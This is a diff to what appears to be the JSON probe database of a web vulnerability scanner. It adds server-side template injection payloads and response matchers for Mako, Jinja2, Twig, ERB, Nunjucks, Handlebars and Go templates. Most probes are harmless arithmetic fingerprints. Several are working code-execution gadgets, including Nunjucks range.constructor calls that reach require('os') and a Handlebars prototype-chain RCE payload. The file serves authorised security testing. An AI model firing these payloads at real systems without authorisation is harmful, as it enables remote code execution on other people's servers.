@@ -369,6 +369,23 @@
           "severity": "critical",
           "confidence_boost": 95,
           "variables": {}
+        },
+        {
+          "payload": "<% import os %>${os.name}",
+          "description": "Mako OS detection via import \u2014 'posix' or 'nt' in response confirms Python code execution within Mako template",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "posix",
+                "nt"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
         }
       ]
     },
@@ -483,8 +500,8 @@
         }
       ]
     },
-    "detection_polyglot": {
-      "description": "Universal SSTI detection polyglots \u2014 designed to provoke a response from multiple template engines simultaneously",
+    "detection": {
+      "description": "Universal SSTI detection probes \u2014 polyglots and engine-specific arithmetic to fingerprint which template engine is active",
       "tech_match": [],
       "param_match": [
         "name",
@@ -514,6 +531,130 @@
           "variables": {}
         },
         {
+          "payload": "{{7*7}}",
+          "description": "Double-curly arithmetic \u2014 49 confirms Jinja2, Twig, Nunjucks, or Handlebars evaluation",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "#{7*7}",
+          "description": "Ruby ERB / Velocity / Java EL expression probe \u2014 49 confirms template evaluation",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "${7*7}",
+          "description": "Dollar-curly arithmetic \u2014 49 confirms FreeMarker, Mako, or EL expression evaluation",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<%= 7*7 %>",
+          "description": "ERB/EJS tag arithmetic \u2014 49 confirms Ruby ERB or Node.js EJS evaluation",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{7*'7'}}",
+          "description": "Jinja2 vs Twig differentiator \u2014 Jinja2 returns '7777777' (string repetition), Twig returns '49' (arithmetic)",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "7777777"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
           "payload": "{{7*7}}${7*7}<%=7*7%>${{7*7}}",
           "description": "Multi-engine arithmetic polyglot \u2014 49 anywhere in the response confirms at least one engine evaluated the expression",
           "matchers": [
@@ -539,10 +680,30 @@
           "severity": "high",
           "confidence_boost": 60,
           "variables": {}
-        },
+        }
+      ]
+    },
+    "nunjucks": {
+      "description": "Server-Side Template Injection probes for Nunjucks (Node.js stacks)",
+      "tech_match": [
+        "Node.js",
+        "Express"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
         {
-          "payload": "#{7*7}",
-          "description": "Ruby ERB / Velocity expression probe \u2014 49 confirms ERB or Velocity template evaluation",
+          "payload": "{{range.constructor(\"return 7*7\")()}}",
+          "description": "Nunjucks constructor trick \u2014 range.constructor evaluates JavaScript; 49 confirms code execution in Nunjucks",
           "matchers": [
             {
               "type": "word",
@@ -560,6 +721,161 @@
                 "\"49\"",
                 "v49",
                 "#49"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "{{range.constructor(\"return global.process.mainModule.require('os').platform()\")()}}",
+          "description": "Nunjucks RCE confirmation \u2014 os.platform() returns 'linux'/'win32'/'darwin' confirming arbitrary code execution",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "linux",
+                "win32",
+                "darwin"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    },
+    "handlebars": {
+      "description": "Server-Side Template Injection probes for Handlebars (Node.js stacks)",
+      "tech_match": [
+        "Node.js",
+        "Express"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{this}}",
+          "description": "Handlebars context dump \u2014 reflects the current context object; non-empty output confirms Handlebars processing",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 20
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+          "description": "Handlebars prototype pollution RCE gadget \u2014 exploits helper lookup chain for code execution; error or unusual output confirms processing",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "TypeError",
+                "Cannot read",
+                "undefined"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "golang": {
+      "description": "Server-Side Template Injection probes for Go text/template and html/template",
+      "tech_match": [
+        "Go",
+        "Golang",
+        "Gin",
+        "Echo"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{.}}",
+          "description": "Go template context dump \u2014 reflects the entire pipeline data object; structured output confirms Go template processing",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 10
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "{{.}}"
+              ]
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{printf \"%s\" \"SWISSKNIFE_SSTI_PROBE\"}}",
+          "description": "Go template printf function \u2014 SWISSKNIFE_SSTI_PROBE in response confirms Go template evaluation",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SWISSKNIFE_SSTI_PROBE"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "{{printf \"%v\" .}}",
+          "description": "Go template verbose context dump \u2014 %v format reveals struct fields and types, confirming template injection",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 20
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "{{printf"
               ]
             }
           ],
